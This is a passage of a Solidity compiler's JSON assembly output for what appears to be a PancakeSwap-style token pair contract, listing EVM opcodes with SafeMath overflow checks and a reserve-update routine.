											"name": "SWAP1"
										},
										{
											"begin": 1903,
											"end": 2031,
											"name": "SUB"
										},
										{
											"begin": 1903,
											"end": 2031,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 1903,
											"end": 2031,
											"name": "ADD"
										},
										{
											"begin": 1903,
											"end": 2031,
											"name": "SWAP1"
										},
										{
											"begin": 1903,
											"end": 2031,
											"name": "REVERT"
										},
										{
											"begin": 1903,
											"end": 2031,
											"name": "tag",
											"value": "324"
										},
										{
											"begin": 1903,
											"end": 2031,
											"name": "JUMPDEST"
										},
										{
											"begin": 1700,
											"end": 2038,
											"name": "POP"
										},
										{
											"begin": 1700,
											"end": 2038,
											"name": "POP"
										},
										{
											"begin": 1700,
											"end": 2038,
											"name": "POP"
										},
										{
											"begin": 1700,
											"end": 2038,
											"name": "POP"
										},
										{
											"begin": 1700,
											"end": 2038,
											"name": "POP"
										},
										{
											"begin": 1700,
											"end": 2038,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 481,
											"end": 630,
											"name": "tag",
											"value": "168"
										},
										{
											"begin": 481,
											"end": 630,
											"name": "JUMPDEST"
										},
										{
											"begin": 539,
											"end": 548,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 568,
											"end": 574,
											"name": "DUP2"
										},
										{
											"begin": 568,
											"end": 574,
											"name": "ISZERO"
										},
										{
											"begin": 568,
											"end": 574,
											"name": "DUP1"
										},
										{
											"begin": 568,
											"end": 598,
											"name": "PUSH [tag]",
											"value": "326"
										},
										{
											"begin": 568,
											"end": 598,
											"name": "JUMPI"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 583,
											"end": 588,
											"name": "DUP1"
										},
										{
											"begin": 583,
											"end": 588,
											"name": "DUP3"
										},
										{
											"begin": 583,
											"end": 588,
											"name": "MUL"
										},
										{
											"begin": 597,
											"end": 598,
											"name": "DUP3"
										},
										{
											"begin": 592,
											"end": 593,
											"name": "DUP3"
										},
										{
											"begin": 583,
											"end": 588,
											"name": "DUP3"
										},
										{
											"begin": 592,
											"end": 593,
											"name": "DUP2"
										},
										{
											"begin": 578,
											"end": 593,
											"name": "PUSH [tag]",
											"value": "327"
										},
										{
											"begin": 578,
											"end": 593,
											"name": "JUMPI"
										},
										{
											"begin": 578,
											"end": 593,
											"name": "INVALID"
										},
										{
											"begin": 578,
											"end": 593,
											"name": "tag",
											"value": "327"
										},
										{
											"begin": 578,
											"end": 593,
											"name": "JUMPDEST"
										},
										{
											"begin": 578,
											"end": 593,
											"name": "DIV"
										},
										{
											"begin": 578,
											"end": 598,
											"name": "EQ"
										},
										{
											"begin": 568,
											"end": 598,
											"name": "tag",
											"value": "326"
										},
										{
											"begin": 568,
											"end": 598,
											"name": "JUMPDEST"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "PUSH [tag]",
											"value": "181"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "JUMPI"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "DUP1"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "DUP2"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "MSTORE"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "DUP3"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "ADD"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "MSTORE"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "PUSH",
											"value": "14"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "DUP3"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "ADD"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "MSTORE"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "64732D6D6174682D6D756C2D6F766572666C6F77"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "60"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "PUSH",
											"value": "44"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "DUP3"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "ADD"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "MSTORE"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "SWAP1"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "MLOAD"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "SWAP1"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "DUP2"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "SWAP1"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "SUB"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "ADD"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "SWAP1"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "REVERT"
										},
										{
											"begin": 339,
											"end": 475,
											"name": "tag",
											"value": "170"
										},
										{
											"begin": 339,
											"end": 475,
											"name": "JUMPDEST"
										},
										{
											"begin": 431,
											"end": 436,
											"name": "DUP1"
										},
										{
											"begin": 431,
											"end": 436,
											"name": "DUP3"
										},
										{
											"begin": 431,
											"end": 436,
											"name": "SUB"
										},
										{
											"begin": 426,
											"end": 442,
											"name": "DUP3"
										},
										{
											"begin": 426,
											"end": 442,
											"name": "DUP2"
										},
										{
											"begin": 426,
											"end": 442,
											"name": "GT"
										},
										{
											"begin": 426,
											"end": 442,
											"name": "ISZERO"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "PUSH [tag]",
											"value": "181"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "JUMPI"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "DUP1"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "DUP2"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "MSTORE"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "DUP3"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "ADD"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "MSTORE"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "PUSH",
											"value": "15"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "DUP3"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "ADD"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "MSTORE"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "64732D6D6174682D7375622D756E646572666C6F77"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "58"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "PUSH",
											"value": "44"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "DUP3"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "ADD"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "MSTORE"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "SWAP1"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "MLOAD"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "SWAP1"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "DUP2"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "SWAP1"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "SUB"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "ADD"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "SWAP1"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "REVERT"
										},
										{
											"begin": 2947,
											"end": 3930,
											"name": "tag",
											"value": "179"
										},
										{
											"begin": 2947,
											"end": 3930,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 3109,
											"end": 3132,
											"name": "DUP5"
										},
										{
											"begin": 3109,
											"end": 3132,
											"name": "GT"
										},
										{
											"begin": 3109,
											"end": 3132,
											"name": "DUP1"
										},
										{
											"begin": 3109,
											"end": 3132,
											"name": "ISZERO"
										},
										{
											"begin": 3109,
											"end": 3132,
											"name": "SWAP1"
										},
										{
											"begin": 3109,
											"end": 3159,
											"name": "PUSH [tag]",
											"value": "332"
										},
										{
											"begin": 3109,
											"end": 3159,
											"name": "JUMPI"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 3136,
											"end": 3159,
											"name": "DUP4"
										},
										{
											"begin": 3136,
											"end": 3159,
											"name": "GT"
										},
										{
											"begin": 3136,
											"end": 3159,
											"name": "ISZERO"
										},
										{
											"begin": 3109,
											"end": 3159,
											"name": "tag",
											"value": "332"
										},
										{
											"begin": 3109,
											"end": 3159,
											"name": "JUMPDEST"
										},
										{
											"begin": 3088,
											"end": 3202,
											"name": "PUSH [tag]",
											"value": "333"
										},
										{
											"begin": 3088,
											"end": 3202,
											"name": "JUMPI"
										},
										{
											"begin": 3088,
											"end": 3202,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 3088,
											"end": 3202,
											"name": "DUP1"
										},
										{
											"begin": 3088,
											"end": 3202,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 3088,
											"end": 3202,
											"name": "DUP2"
										},
										{
											"begin": 3088,
											"end": 3202,
											"name": "MSTORE"
										},
										{
											"begin": 3088,
											"end": 3202,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3088,
											"end": 3202,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 3088,
											"end": 3202,
											"name": "DUP3"
										},
										{
											"begin": 3088,
											"end": 3202,
											"name": "ADD"
										},
										{
											"begin": 3088,
											"end": 3202,
											"name": "MSTORE"
										},
										{
											"begin": 3088,
											"end": 3202,
											"name": "PUSH",
											"value": "11"
										},
										{
											"begin": 3088,
											"end": 3202,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 3088,
											"end": 3202,
											"name": "DUP3"
										},
										{
											"begin": 3088,
											"end": 3202,
											"name": "ADD"
										},
										{
											"begin": 3088,
											"end": 3202,
											"name": "MSTORE"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "50616E63616B653A204F564552464C4F57"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "78"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 3088,
											"end": 3202,
											"name": "PUSH",
											"value": "44"
										},
										{
											"begin": 3088,
											"end": 3202,
											"name": "DUP3"
										},
										{
											"begin": 3088,
											"end": 3202,
											"name": "ADD"
										},
										{
											"begin": 3088,
											"end": 3202,
											"name": "MSTORE"
										},
										{
											"begin": 3088,
											"end": 3202,
											"name": "SWAP1"
										},
										{
											"begin": 3088,
											"end": 3202,
											"name": "MLOAD"
										},
										{
											"begin": 3088,
											"end": 3202,
											"name": "SWAP1"
										},
										{
											"begin": 3088,
											"end": 3202,
											"name": "DUP2"
										},
										{
											"begin": 3088,
											"end": 3202,
											"name": "SWAP1"
										},
										{
											"begin": 3088,
											"end": 3202,
											"name": "SUB"
										},
										{
											"begin": 3088,
											"end": 3202,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 3088,
											"end": 3202,
											"name": "ADD"
										},
										{
											"begin": 3088,
											"end": 3202,
											"name": "SWAP1"
										},
										{
											"begin": 3088,
											"end": 3202,
											"name": "REVERT"
										},
										{
											"begin": 3088,
											"end": 3202,
											"name": "tag",
											"value": "333"
										},
										{
											"begin": 3088,
											"end": 3202,
											"name": "JUMPDEST"
										},
										{
											"begin": 3317,
											"end": 3335,
											"name": "PUSH",
											"value": "B"
										},
										{
											"begin": 3317,
											"end": 3335,
											"name": "SLOAD"
										},
										{
											"begin": 3243,
											"end": 3268,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 3243,
											"end": 3258,
											"name": "TIMESTAMP"
										},
										{
											"begin": 3243,
											"end": 3268,
											"name": "DUP2"
										},
										{
											"begin": 3243,
											"end": 3268,
											"name": "AND"
										},
										{
											"begin": 3243,
											"end": 3268,
											"name": "SWAP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 3317,
											"end": 3335,
											"name": "SWAP1"
										},
										{
											"begin": 3317,
											"end": 3335,
											"name": "DIV"
										},
										{
											"begin": 3317,
											"end": 3335,
											"name": "DUP2"
										},
										{
											"begin": 3317,
											"end": 3335,
											"name": "AND"
										},
										{
											"begin": 3300,
											"end": 3335,
											"name": "DUP3"
										},
										{
											"begin": 3300,
											"end": 3335,
											"name": "SUB"
										},
										{
											"begin": 3300,
											"end": 3335,
											"name": "SWAP1"
										},
										{
											"begin": 3372,
											"end": 3387,
											"name": "DUP2"
										},
										{
											"begin": 3372,
											"end": 3387,
											"name": "AND"
										},
										{
											"begin": 3372,
											"end": 3387,
											"name": "ISZERO"
										},
										{
											"begin": 3372,
											"end": 3387,
											"name": "DUP1"
										},
										{
											"begin": 3372,
											"end": 3387,
											"name": "ISZERO"
										},
										{
											"begin": 3372,
											"end": 3387,
											"name": "SWAP1"
										},
										{
											"begin": 3372,
											"end": 3405,
											"name": "PUSH [tag]",
											"value": "335"
										},
										{
											"begin": 3372,
											"end": 3405,
											"name": "JUMPI"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 3391,
											"end": 3405,
											"name": "DUP5"
										},
										{
											"begin": 3391,
											"end": 3405,
											"name": "AND"
										},
										{
											"begin": 3391,
											"end": 3405,
											"name": "ISZERO"
										},
										{
											"begin": 3391,
											"end": 3405,
											"name": "ISZERO"
										},
										{
											"begin": 3372,
											"end": 3405,
											"name": "tag",
											"value": "335"
										},
										{
											"begin": 3372,
											"end": 3405,
											"name": "JUMPDEST"
										},
										{
											"begin": 3372,
											"end": 3423,
											"name": "DUP1"
										},
										{
											"begin": 3372,
											"end": 3423,
											"name": "ISZERO"
										},
										{
											"begin": 3372,
											"end": 3423,
											"name": "PUSH [tag]",
											"value": "336"
										},
										{
											"begin": 3372,
											"end": 3423,
											"name": "JUMPI"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 3409,
											"end": 3423,
											"name": "DUP4"
										},
										{
											"begin": 3409,
											"end": 3423,
											"name": "AND"
										},
										{
											"begin": 3409,
											"end": 3423,
											"name": "ISZERO"
										},
										{
											"begin": 3409,
											"end": 3423,
											"name": "ISZERO"
										},
										{
											"begin": 3372,
											"end": 3423,
											"name": "tag",
											"value": "336"
										},
										{
											"begin": 3372,
											"end": 3423,
											"name": "JUMPDEST"
										},
										{
											"begin": 3368,
											"end": 3764,
											"name": "ISZERO"
										},
										{
											"begin": 3368,
											"end": 3764,
											"name": "PUSH [tag]",
											"value": "337"
										},
										{
											"begin": 3368,
											"end": 3764,
											"name": "JUMPI"
										},
										{
											"begin": 3608,
											"end": 3619,
											"name": "DUP1"
										},
										{
											"begin": 3539,
											"end": 3619,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 3539,
											"end": 3619,
											"name": "AND"
										},
										{
											"begin": 3544,
											"end": 3588,
											"name": "PUSH [tag]",
											"value": "338"
										},
										{
											"begin": 3578,
											"end": 3587,
											"name": "DUP6"
										},
										{
											"begin": 3544,
											"end": 3571,
											"name": "PUSH [tag]",
											"value": "339"
										},
										{
											"begin": 3561,
											"end": 3570,
											"name": "DUP7"
										},
										{
											"begin": 3544,
											"end": 3560,
											"name": "PUSH [tag]",
											"value": "340"
										},
										{
											"begin": 3544,
											"end": 3571,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 3544,
											"end": 3571,
											"name": "tag",
											"value": "339"
										},
										{
											"begin": 3544,
											"end": 3571,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 3544,
											"end": 3577,
											"name": "AND"
										},
										{
											"begin": 3544,
											"end": 3577,
											"name": "SWAP1"
										},
										{
											"begin": 3544,
											"end": 3588,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 3544,
											"end": 3577,
											"name": "PUSH [tag]",
											"value": "341"
										},
										{
											"begin": 3544,
											"end": 3588,
											"name": "AND"
										},
										{
											"begin": 3544,
											"end": 3588,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 3544,
											"end": 3588,
											"name": "tag",
											"value": "338"
										},
										{
											"begin": 3544,
											"end": 3588,
											"name": "JUMPDEST"
										},
										{
											"begin": 3499,
											"end": 3519,
											"name": "PUSH",
											"value": "C"
										},
										{
											"begin": 3499,
											"end": 3619,
											"name": "DUP1"
										},
										{
											"begin": 3499,
											"end": 3619,
											"name": "SLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 3539,
											"end": 3589,
											"name": "SWAP3"
										},
										{
											"begin": 3539,
											"end": 3589,
											"name": "SWAP1"
										},
										{
											"begin": 3539,
											"end": 3589,
											"name": "SWAP3"
										},
										{
											"begin": 3539,
											"end": 3589,
											"name": "AND"
										},
										{
											"begin": 3539,
											"end": 3619,
											"name": "SWAP3"
										},
										{
											"begin": 3539,
											"end": 3619,
											"name": "SWAP1"
										},
										{
											"begin": 3539,
											"end": 3619,
											"name": "SWAP3"
										},
										{
											"begin": 3539,
											"end": 3619,
											"name": "MUL"
										},
										{
											"begin": 3499,
											"end": 3619,
											"name": "ADD"
										},
										{
											"begin": 3499,
											"end": 3619,
											"name": "SWAP1"
										},
										{
											"begin": 3499,
											"end": 3619,
											"name": "SSTORE"
										},
										{
											"begin": 3673,
											"end": 3753,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 3673,
											"end": 3753,
											"name": "DUP2"
										},
										{
											"begin": 3673,
											"end": 3753,
											"name": "AND"
										},
										{
											"begin": 3678,
											"end": 3722,
											"name": "PUSH [tag]",
											"value": "342"
										},
										{
											"begin": 3712,
											"end": 3721,
											"name": "DUP5"
										},
										{
											"begin": 3678,
											"end": 3705,
											"name": "PUSH [tag]",
											"value": "339"
										},
										{
											"begin": 3695,
											"end": 3704,
											"name": "DUP8"
										},
										{
											"begin": 3678,
											"end": 3694,
											"name": "PUSH [tag]",
											"value": "340"
										},
										{
											"begin": 3678,
											"end": 3705,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 3678,
											"end": 3722,
											"name": "tag",
											"value": "342"
										},
										{
											"begin": 3678,
											"end": 3722,
											"name": "JUMPDEST"
										},
										{
											"begin": 3633,
											"end": 3653,
											"name": "PUSH",
											"value": "D"
										},
										{
											"begin": 3633,
											"end": 3753,
											"name": "DUP1"
										},
										{
											"begin": 3633,
											"end": 3753,
											"name": "SLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 3673,
											"end": 3723,
											"name": "SWAP3"
										},
										{
											"begin": 3673,
											"end": 3723,
											"name": "SWAP1"
										},
										{
											"begin": 3673,
											"end": 3723,
											"name": "SWAP3"
										},
										{
											"begin": 3673,
											"end": 3723,
											"name": "AND"
										},
										{
											"begin": 3673,
											"end": 3753,
											"name": "SWAP3"
										},
										{
											"begin": 3673,
											"end": 3753,
											"name": "SWAP1"
										},
										{
											"begin": 3673,
											"end": 3753,
											"name": "SWAP3"
										},
										{
											"begin": 3673,
											"end": 3753,
											"name": "MUL"
										},
										{
											"begin": 3633,
											"end": 3753,
											"name": "ADD"
										},
										{
											"begin": 3633,
											"end": 3753,
											"name": "SWAP1"
										},
										{
											"begin": 3633,
											"end": 3753,
											"name": "SSTORE"
										},
										{
											"begin": 3368,
											"end": 3764,
											"name": "tag",
											"value": "337"
										},
										{
											"begin": 3368,
											"end": 3764,
											"name": "JUMPDEST"
										},
										{
											"begin": 3773,
											"end": 3781,
											"name": "PUSH",
											"value": "B"
										},
										{
											"begin": 3773,
											"end": 3801,
											"name": "DUP1"
										},
										{
											"begin": 3773,
											"end": 3801,
											"name": "SLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "NOT"
										},
										{
											"begin": 3773,
											"end": 3801,
											"name": "AND"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 3773,
											"end": 3801,
											"name": "DUP9"
										},
										{
											"begin": 3773,
											"end": 3801,
											"name": "DUP2"
										},
										{
											"begin": 3773,
											"end": 3801,
											"name": "AND"
										},
										{
											"begin": 3773,
											"end": 3801,
											"name": "SWAP2"
										},
										{
											"begin": 3773,
											"end": 3801,
											"name": "SWAP1"
										},
										{
											"begin": 3773,
											"end": 3801,
											"name": "SWAP2"
										},
										{
											"begin": 3773,
											"end": 3801,
											"name": "OR"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "NOT"
										},
										{
											"begin": 3811,
											"end": 3839,
											"name": "AND"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 3811,
											"end": 3839,
											"name": "DUP9"
										},
										{
											"begin": 3811,
											"end": 3839,
											"name": "DUP4"
										},
										{
											"begin": 3811,
											"end": 3839,
											"name": "AND"
										},
										{
											"begin": 3811,
											"end": 3839,
											"name": "DUP2"
										},
										{
											"begin": 3811,
											"end": 3839,
											"name": "MUL"
										},
										{
											"begin": 3811,
											"end": 3839,
											"name": "SWAP2"
										},
										{
											"begin": 3811,
											"end": 3839,
											"name": "SWAP1"
										},
										{
											"begin": 3811,
											"end": 3839,
											"name": "SWAP2"
										},
										{
											"begin": 3811,
											"end": 3839,
											"name": "OR"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 3849,
											"end": 3884,
											"name": "AND"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 3849,
											"end": 3884,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 3849,
											"end": 3884,
											"name": "DUP8"
										},
										{
											"begin": 3849,
											"end": 3884,
											"name": "AND"
										},
										{
											"begin": 3849,
											"end": 3884,
											"name": "MUL"
										},
										{
											"begin": 3849,
											"end": 3884,
											"name": "OR"
										},
										{
											"begin": 3849,
											"end": 3884,
											"name": "SWAP3"
										},
										{
											"begin": 3849,
											"end": 3884,
											"name": "DUP4"
										},
										{
											"begin": 3849,
											"end": 3884,
											"name": "SWAP1"
										},
										{
											"begin": 3849,
											"end": 3884,
											"name": "SSTORE"
										},
										{
											"begin": 3899,
											"end": 3923,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 3899,
											"end": 3923,
											"name": "DUP1"
										},
										{
											"begin": 3899,
											"end": 3923,
											"name": "MLOAD"
										},
										{
											"begin": 3904,
											"end": 3912,
											"name": "DUP5"
										},
										{
											"begin": 3904,
											"end": 3912,
											"name": "DUP5"
										},
										{
											"begin": 3904,
											"end": 3912,
											"name": "AND"
										},
										{
											"begin": 3899,
											"end": 3923,
											"name": "DUP2"
										},
										{
											"begin": 3899,
											"end": 3923,
											"name": "MSTORE"
										},
										{
											"begin": 3914,
											"end": 3922,
											"name": "SWAP2"
										},
										{
											"begin": 3914,
											"end": 3922,
											"name": "SWAP1"
										},
										{
											"begin": 3914,
											"end": 3922,
											"name": "SWAP4"
										},
										{
											"begin": 3914,
											"end": 3922,
											"name": "DIV"
										},
										{
											"begin": 3914,
											"end": 3922,
											"name": "SWAP1"
										},
										{
											"begin": 3914,
											"end": 3922,
											"name": "SWAP2"
										},
										{
											"begin": 3914,
											"end": 3922,
											"name": "AND"
										},
										{
											"begin": 3899,
											"end": 3923,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3899,
											"end": 3923,
											"name": "DUP3"
										},
										{
											"begin": 3899,
											"end": 3923,
											"name": "ADD"
										},
										{
											"begin": 3899,
											"end": 3923,
											"name": "MSTORE"
										},
										{
											"begin": 3899,
											"end": 3923,
											"name": "DUP2"
										},
										{
											"begin": 3899,
											"end": 3923,
											"name": "MLOAD"
										},
										{
											"begin": 3899,
											"end": 3923,
											"name": "PUSH",
											"value": "1C411E9A96E071241C2F21F7726B17AE89E3CAB4C78BE50E062B03A9FFFBBAD1"
										},
										{
											"begin": 3899,
											"end": 3923,
